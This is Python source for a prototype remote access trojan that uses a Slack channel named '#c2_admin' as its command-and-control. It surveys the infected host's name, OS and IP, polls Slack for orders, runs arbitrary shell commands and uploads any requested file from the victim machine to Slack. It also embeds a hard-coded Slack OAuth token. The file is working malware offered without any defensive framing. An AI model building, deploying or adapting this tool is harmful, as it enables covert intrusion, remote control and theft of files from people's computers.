# This is a prototype
# The full version will need to be built without installing dependencies

import datetime
import platform
import os
import random
import re
import socket
import subprocess
import time

from string import ascii_lowercase, ascii_uppercase, digits

# Need to create the following libraries manually
import slack

# Need to derive a build script to autopopulate the following:
SLACK_AUTHENTICATION = {
    "oauth_token": "xoxp-869484875895-856157625219-869979229046-028a1e320b5d2f552a748bac71e011ac",
    "c2_channel": "#c2_admin"
}

class RemoteAccessTool:
    
    def __init__(self, slack_authentication):
        self.session_uid = "".join(random.choice(ascii_lowercase + ascii_uppercase + digits) for i in range(13))
        self.oauth_token = slack_authentication.get("oauth_token")
        self.last_timestamp = None
        self.c2_channel = slack_authentication.get("c2_channel")
        self.c2_channel_id = None
        self.sleep_timer = 10
        self.heartbeat = True
        
        self.commands = RemoteAccessCapabilities()
        self.client = self.__create_client()
        
    def __get_file_contents(self, file_path):
        class FileContents:
            
            def __init__(self):
                self.success = None
                self.location = None
                self.error = None

        results = FileContents()
        
        if os.path.isfile(file_path):
            try:
                open(file_path, "rb").read()
            except Exception as e:
                results.success = False
                results.error = e  
            else:
                results.success = True
                results.location = file_path
            finally:
                return results
        else:
            results.success = False
            results.error = f"[!] Error: Attempted to download '{file_path}'. File does not exist."
            return results
                
    def __create_client(self):
        return slack.WebClient(token=self.oauth_token)
    
    def get_channel_id(self, channel_name):
        channel_list = self.client.channels_list()
        if isinstance(channel_list.data, dict) and channel_list.data.get("ok"):
            for channel in channel_list.data.get("channels"):
                if channel.get("name").startswith(channel_name.lstrip("#")):
                    return channel.get("id")
        
        return False
    
    def get_channel_log(self):
        if self.c2_channel_id is None:
            self.c2_channel_id = self.get_channel_id(self.c2_channel)
        
        log_lines = []
        
        if self.last_timestamp is None:
            for log_entry in self.client.channels_history(channel=self.c2_channel_id).data.get("messages"):
                if re.match(f"Hey {self.session_uid},", log_entry.get("text")):
                    log_lines.append((log_entry.get("text"), log_entry.get("ts")))
            return log_lines
        
        for log_entry in self.client.channels_history(channel=self.c2_channel_id).data.get("messages"):
            if float(log_entry.get("ts")) > float(self.last_timestamp):
                if re.match(f"Hey {self.session_uid},", log_entry.get("text")):
                    log_lines.append((log_entry.get("text"), log_entry.get("ts")))
                
        return log_lines        
        
    
    def get_tasking(self):
        for task, timestamp in self.get_channel_log():
            self.last_timestamp = timestamp
            todo = re.findall(",(.*)", task)[-1].strip()
            if todo.startswith("gtfo"): 
                self.send_text("Tasked to Shut Down!!!")  
                exit(-1) 
            if todo.startswith("who am i"): return self.send_text(self.commands.shell_execute("whoami")            )
            if todo.startswith("run "): return self.send_text(self.commands.shell_execute(todo.lstrip("run ")))
            if todo.startswith("set "):
                todo = " ".join(todo.split(" ")[1:])
                if todo.startswith("sleep "):
                    self.sleep_timer = int(todo.lstrip("sleep "))
                    return self.send_text(f"Sleep Timer Changed To: {self.sleep_timer} seconds")
                if todo.startswith("heartbeat"):
                    self.heartbeat = int(todo.lstrip("heartbeat "))
                    return self.send_text(f"Heartbeat Notifications Set To: {bool(self.heartbeat)}")
            if todo.startswith("grab "):
                return self.send_file(todo.lstrip("grab "))
        
        
    def send_text(self, text):
        text = f"`[{self.session_uid}]`: {text}" 
        response = self.client.chat_postMessage(
            channel = self.c2_channel,
            text = text
        )

        try:
            assert response["ok"]
            assert response["message"]["text"] == text
        except:
            return False
        else:
            return True

    def send_file(self, file_path):
        file_contents = self.__get_file_contents(file_path)
        if file_contents.success:    
            response = self.client.files_upload(
                channels = self.c2_channel,
                title = f"[{self.session_uid}]: [+] Downloaded file: {file_contents.location}",
                file = file_contents.location
            )

            try:
                assert response["ok"]
            except:
                return False
            else:
                return True
        else:
            return self.send_text(file_contents.error)

    def send_heartbeat(self):
        self.send_text(f"Heartbeat Timestamp: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
    
    
    def send_termination(self, error_message):
        self.send_text(f"Termination Timestamp: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\t*Reason:* `{error_message}`")
        
        
class RemoteAccessCapabilities:
    
    def __init__(self):
        self.__initial_connect()
        self.connect_timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
    def __initial_connect(self):
        self.hostname = platform.uname().node.lower()
        self.os_version = f"{platform.uname().system} {platform.uname().version}"
        self.os_architecture = " ".join(platform.architecture())
        self.ip_address = socket.gethostbyname(socket.gethostname())
    
    def shell_execute(self, command):
        return subprocess.check_output(command)
        
    def run_survey(self):
        survey = "`New Connection Survey:`\n"
        survey += f"\t*Hostname:* {self.hostname}\n"
        survey += f"\t*Operating System:* {self.os_version}\n"
        survey += f"\t*Operating System Architecture:* {self.os_architecture}\n"
        survey += f"\t*IP Address:* {self.ip_address}\n"
        survey += f"\t*Connected Timestamp:* {self.connect_timestamp}"
        
        return survey
        

if __name__ == "__main__":
    client = RemoteAccessTool(SLACK_AUTHENTICATION)
    try:
        client.send_text(client.commands.run_survey())
        while True:
            if client.heartbeat:
                client.send_heartbeat()
            client.get_tasking()
            time.sleep(client.sleep_timer)
    except KeyboardInterrupt:
        client.send_termination("KeyboardInterrupt")        
    except Exception as e:
        client.send_termination(" ".join(e.args))